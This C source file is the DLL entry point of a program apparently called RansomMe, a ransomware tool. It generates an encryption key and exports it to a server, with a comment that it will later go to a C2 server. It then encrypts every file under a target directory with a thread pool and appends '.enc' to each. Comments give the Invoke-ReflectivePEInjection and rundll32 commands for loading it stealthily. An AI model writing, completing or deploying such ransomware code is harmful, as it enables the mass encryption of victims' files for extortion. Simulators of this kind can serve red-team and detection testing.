#include "..\RansomMe\RansomMe.h"


// this function can be used with Invoke-ReflectivePEInjection, I modified the script to include a parameter
// you can use the following command: Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType Param -ExeArgs "targetPATH"
// As it only works when injecting into the current process, for injecting in remote process parameters are not supported
//__declspec(dllexport) VoidFunc() {
__declspec(dllexport) VoidFunc(char* target) {
    // This is to print to console
    if (!AttachConsole(ATTACH_PARENT_PROCESS)) {
        AllocConsole();  // Create a new console if no parent console exists
    }

    // Redirect standard output to the console
    FILE* fp;
    freopen_s(&fp, "CONOUT$", "w", stdout);
    freopen_s(&fp, "CONOUT$", "w", stderr);

    // Either get the target as parameter or hardcoded depending on the injection technique
    //    char targetDir[MAX_PATH] = "HarcodedPATH";
    char targetDir[MAX_PATH] = "\0";
    char cryptoFileExt[MAX_EXT] = ".enc";
    char serverName[INTERNET_MAX_HOST_NAME_LENGTH] = "127.0.0.1";

    // Check the input parameter, comment if not used
    if (target[0] == '\0') {
        printf("Error. Set up a target\n");
        return;
    }
    else {
        if (strlen(target) > MAX_PATH) {
            printf("Error: targetDir is longer than MAX_PATH (%d)", MAX_PATH);
            return;
        }
        else {
            // Copy the target dir to targetDir
            strcpy_s(targetDir, MAX_PATH, target);
        }
    }

    //------------- LOCAL VARIABLES -------------------------------------------------
    // general purpose variables
    size_t totalFileNumber = 0;                     // number of files found
    size_t encryptedFileNumber = 0;                 // number of encrypted files
    ULARGE_INTEGER start, end;                      // start time and end time to measure performance

    // thread pool variables
    TP_CALLBACK_ENVIRON poolEnv;               // a pool environment struct to handle the thread pool
    PTP_CLEANUP_GROUP cleanupgroup = NULL;          // a cleanup group handle to safely close all the threads in the pool

    // encryption variables
    HCRYPTPROV hCryptProv = 0;                      // handler for the crypto provider
    HCRYPTKEY hKey = 0;                             // handler for the encryption key

    //------------- INIT AND EXECUTE --------------------------------------------------
        // Initialize the thread pool. This will create a thread pool and a cleanup group
        //   and will link them to the same pool environment handler
    if (!InitThreadPool(&poolEnv, &cleanupgroup)) {
        printf("Could not initialize the thread pool. Error code: %lu\n", GetLastError());
        return;
    }

    // Initialize the crypto environment. This will acquire a context and generate a key
    if (!InitCrypto(&hCryptProv, &hKey)) {
        printf("Could not initialize the crypto environment. Error code: %lu\n", GetLastError());
        return;
    }

    // print the key to a file (this will change to encrypt the key and send it to a C2 server
    if (!ExportKey(hCryptProv, hKey, serverName)) {
        printf("Encryption key could not be exported. Error code: %lu\n", GetLastError());
        return;
    }

    // start the timer
    GetTime(&start);

    totalFileNumber = StartEncryptionWithThreads(targetDir, cryptoFileExt, &encryptedFileNumber, hKey, &poolEnv, cleanupgroup);

    // end the time    
    GetTime(&end);

    printf("%zd files found.\n", totalFileNumber);
    printf("%zd files encrypted.\n", encryptedFileNumber);

    // Calculate the elapsed time in seconds
    ULONGLONG elapsedMilliseconds = (end.QuadPart - start.QuadPart) / 10000000;
    printf("Elapsed Time: %llu seconds\n", elapsedMilliseconds);

    //------------- CLEAN UP --------------------------------------------------------
        // Release the encryption key
    if (hKey) {
        if (!(CryptDestroyKey(hKey))) {
            printf("Error during CryptDestroyKey!. Error code: %lu\n", GetLastError());
        }
    }
    // Release the crypto provider handle.
    if (hCryptProv) {
        if (!(CryptReleaseContext(hCryptProv, 0))) {
            printf("Error during CryptReleaseContext!. Error code: %lu\n", GetLastError());
        }
    }

    //Clean up: Free the console
    FreeConsole();
    return;
}

/*
// This function can be called from rundll32.exe with one parameter:
// rundll32.exe .\RansomMeDLL.dll,run targetPATH
__declspec(dllexport) void CALLBACK run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {

    // This is to print to console
    if (!AttachConsole(ATTACH_PARENT_PROCESS)) {
        AllocConsole();  // Create a new console if no parent console exists
    }

    // Redirect standard output to the console
    FILE* fp;
    freopen_s(&fp, "CONOUT$", "w", stdout);
    freopen_s(&fp, "CONOUT$", "w", stderr);

    // Hardcode here your parameters
//    char targetDir[MAX_PATH] = "targetPATH";
    char cryptoFileExt[MAX_EXT] = ".enc";
    char serverName[INTERNET_MAX_HOST_NAME_LENGTH] = "127.0.0.1";
    
    char targetDir[MAX_PATH] = "\0";

    // Check for input parameters
    if (lpszCmdLine && lpszCmdLine[0] != '\0') {
        // Check the total length of the input parameter string
        if (strlen(lpszCmdLine) > (MAX_PATH)) {
            printf("Error: targetDir cannot be longer than %s\n", targetDir);
            return;
        }
        else {
            strcpy_s(targetDir, MAX_PATH, lpszCmdLine);
        }
    }
    else {
        printf("Usage: rundll32.exe .\\RansomMeDLL.dll,run targetDir\n");
        return;
    }

//------------- LOCAL VARIABLES -------------------------------------------------
    // general purpose variables
    size_t totalFileNumber = 0;                     // number of files found
    size_t encryptedFileNumber = 0;                 // number of encrypted files
    ULARGE_INTEGER start, end;                      // start time and end time to measure performance

    // thread pool variables
    TP_CALLBACK_ENVIRON poolEnv;               // a pool environment struct to handle the thread pool
    PTP_CLEANUP_GROUP cleanupgroup = NULL;          // a cleanup group handle to safely close all the threads in the pool

    // encryption variables
    HCRYPTPROV hCryptProv = 0;                      // handler for the crypto provider
    HCRYPTKEY hKey = 0;                             // handler for the encryption key

//------------- INIT AND EXECUTE --------------------------------------------------
    // Initialize the thread pool. This will create a thread pool and a cleanup group
    //   and will link them to the same pool environment handler
    if (!InitThreadPool(&poolEnv, &cleanupgroup)) {
        printf("Could not initialize the thread pool. Error code: %lu\n", GetLastError());
        return;
    }

    // Initialize the crypto environment. This will acquire a context and generate a key
    if (!InitCrypto(&hCryptProv, &hKey)) {
        printf("Could not initialize the crypto environment. Error code: %lu\n", GetLastError());
        return;
    }

    // print the key to a file (this will change to encrypt the key and send it to a C2 server
    if (!ExportKey(hCryptProv, hKey, serverName)) {
        printf("Encryption key could not be exported. Error code: %lu\n", GetLastError());
        return;
    }

    // start the timer
    GetTime(&start);

    totalFileNumber = StartEncryptionWithThreads(targetDir, cryptoFileExt, &encryptedFileNumber, hKey, &poolEnv, cleanupgroup);

    // end the time
    GetTime(&end);

    printf("%zd files found.\n", totalFileNumber);
    printf("%zd files encrypted.\n", encryptedFileNumber);

    // Calculate the elapsed time in seconds
    ULONGLONG elapsedMilliseconds = (end.QuadPart - start.QuadPart) / 10000000;
    printf("Elapsed Time: %llu seconds\n", elapsedMilliseconds);

//------------- CLEAN UP --------------------------------------------------------
    // Release the encryption key
    if (hKey) {
        if (!(CryptDestroyKey(hKey))) {
            printf("Error during CryptDestroyKey!. Error code: %lu\n", GetLastError());
        }
    }
    // Release the crypto provider handle.
    if (hCryptProv) {
        if (!(CryptReleaseContext(hCryptProv, 0))) {
            printf("Error during CryptReleaseContext!. Error code: %lu\n", GetLastError());
        }
    }

    //Clean up: Free the console
    FreeConsole();
    return;
}
*/